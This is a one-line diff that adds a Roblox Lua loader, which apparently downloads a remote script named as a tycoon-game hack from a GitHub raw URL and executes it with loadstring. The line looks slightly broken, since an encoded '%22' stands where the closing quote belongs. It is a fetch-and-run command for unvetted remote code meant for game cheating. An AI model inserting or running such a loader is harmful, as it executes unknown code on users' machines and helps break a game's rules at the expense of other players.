@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RbxScriptCreator/UltraPowerTyconHack/main/UltraPowerTyconScript.lua%22))()
